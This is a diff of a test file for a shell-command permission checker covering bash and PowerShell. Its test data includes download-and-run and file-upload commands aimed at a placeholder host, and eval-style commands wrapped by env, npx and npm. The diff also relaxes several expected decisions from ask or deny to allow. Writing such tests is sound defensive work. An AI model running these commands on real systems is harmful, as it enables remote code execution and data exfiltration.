@@ -6,7 +6,7 @@ import { join } from "node:path";
 import { PermissionManager } from "../permission-manager.js";
 import { buildShellRuleApproval } from "../rules/shell-rule-approval.js";
 import { checkShellPermission } from "../../__tests__/support/permission-lane.js";
-import { inspectShellCommand } from "../rules/shell-exfiltration.js";
+import { inspectShellCommand } from "../rules/literal-shell-inspection.js";
 import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
 import { __resetSessionStoreForTest } from "../user-approval-store.js";
 import { withCurrentShellRuleVersion } from "../../shared/shell-rule-version.js";
@@ -15,7 +15,7 @@ let cwd: string;
 let manager: PermissionManager;
 beforeEach(() => {
   cwd = realpathSync(mkdtempSync(join(tmpdir(), "positive-permission-")));
-  vi.stubEnv("AVE_HOME", cwd);
+  vi.stubEnv("AVE_HOME", join(cwd, "state"));
   __resetSessionStoreForTest();
   manager = new PermissionManager(join(cwd, "permissions.json"));
   manager.setMode("allow");
@@ -33,14 +33,18 @@ const REFUSED = [
   "grep", "rg", "cut notes.txt", "Select-String -Path notes.txt",
 ] as const;
 describe.each(["bash", "powershell"] as const)("closed positive command proof (%s)", (dialect: ShellRuleDialect) => {
-  const cases = dialect === "bash" ? [...REFUSED, "wget https://x.invalid/file; cat file"] : REFUSED;
-  it.each(cases)("never repairs unproven syntax with a broad allow: %s", (command) => {
+  const cases = (dialect === "bash" ? [...REFUSED, "wget https://x.invalid/file; cat file"] : REFUSED).map((command) => ({ command, protectedMutation: command === "git branch temporary; git status" }));
+  it.each(cases)("keeps unproven syntax outside reusable approval: $command", ({ command, protectedMutation }) => {
     const inspect = dialect === "bash" ? inspectShellCommand : inspectPowerShellCommand;
     expect(inspect(command, cwd).outcome).toBe("unproven");
     expect(buildShellRuleApproval(dialect, command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
     for (const sandboxed of [false, true]) {
-      expect(checkShellPermission(manager, cwd, "positive-session", command, dialect, sandboxed)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-      expect(checkShellPermission(manager, cwd, "positive-session", command, dialect, sandboxed, true)).toMatchObject({ decision: "deny", layer: 2 });
+      expect(checkShellPermission(manager, cwd, "positive-session", command, dialect, sandboxed)).toMatchObject(protectedMutation
+        ? { decision: "ask", forceModal: true, reasonCode: "protected-path" }
+        : { decision: "allow", reasonCode: "rule-allow" });
+      expect(checkShellPermission(manager, cwd, "positive-session", command, dialect, sandboxed, true)).toMatchObject(protectedMutation
+        ? { decision: "deny", reasonCode: "no-approver" }
+        : { decision: "allow", reasonCode: "rule-allow" });
     }
   });
 });
@@ -48,7 +52,7 @@ it.each(["–", "—", "―"])("refuses unsupported parameter punctuation %s rat
   for (const command of [`Write-Output ${dash}Unknown`, `Get-Content ${dash}Unknown notes.txt`, `Get-Content -Path ${dash}Unknown`, `Invoke-Expression ${dash}Verbose`, `Invoke-WebRequest -Uri https://x.invalid ${dash}OutFile:runner; Write-Output ready`]) {
     expect(inspectPowerShellCommand(command, cwd).outcome).toBe("unproven");
     expect(buildShellRuleApproval("powershell", command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
-    expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", true, true).decision).toBe("deny");
+    expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", true, true)).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
   }
 });
 it.each(["env Write-Output ready", "env iwr -Uri https://x.invalid -InFile notes.txt", "npx Write-Output ready", "npm exec -- Invoke-Expression 'dir'", "env eval 'ls'", "command Write-Output ready", "builtin Write-Output ready"])("does not use shell grammar for a delegated native command: %s", (command) => {
@@ -59,7 +63,7 @@ it.each(["env Write-Output ready", "env iwr -Uri https://x.invalid -InFile notes
   expect(inspectPowerShellCommand(command, cwd).outcome).toBe("unproven");
   expect(buildShellRuleApproval("powershell", command, cwd, { allow: true, deny: true }).exactRule).toBeNull();
   for (const sandboxed of [false, true]) {
-    expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", sandboxed)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-    expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", sandboxed, true)).toMatchObject({ decision: "deny", layer: 2 });
+    expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", sandboxed)).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
+    expect(checkShellPermission(manager, cwd, "positive-session", command, "powershell", sandboxed, true)).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
   }
 });
